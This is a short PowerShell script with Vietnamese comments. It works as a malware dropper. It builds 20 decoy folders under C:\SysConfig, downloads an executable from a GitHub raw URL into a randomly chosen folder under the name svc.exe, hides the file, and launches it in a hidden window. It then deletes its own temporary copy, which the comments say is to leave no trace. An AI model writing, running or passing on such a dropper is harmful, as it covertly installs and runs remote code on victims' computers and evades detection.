# === KHÓA: Chỉ chạy 1 lần ===
$l = 'C:\SysConfig\_lock'
if (Test-Path $l) { exit }
New-Item -ItemType Directory -Force -Path 'C:\SysConfig' | Out-Null
'' | Set-Content $l

# === TẠO 20 THƯ MỤC CON ===
$n = 'Net','Sys','Dat','Cor','Win'
1..20 | ForEach-Object {
    $r = $n[$_ % 5] + $_
    $p = "C:\SysConfig\$r"
    New-Item -ItemType Directory -Force -Path $p | Out-Null
    'x' | Set-Content "$p\a.txt"
}

# === CHỌN NGẪU NHIÊN 1 THƯ MỤC, TẢI FILE VÀO ĐÓ ===
$f = $n[(Get-Random -Max 5)] + (Get-Random -Min 1 -Max 21)
$t = "C:\SysConfig\$f\svc.exe"
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/honggiabao2911/a/main/main.exe' -OutFile $t -UseBasicParsing

# === ẨN FILE + CHẠY NGẦM ===
attrib +h $t
Start-Process $t -WindowStyle Hidden

# === TỰ XÓA SCRIPT TẠM (không để lại dấu vết) ===
Remove-Item $env:TEMP\x.ps1 -Force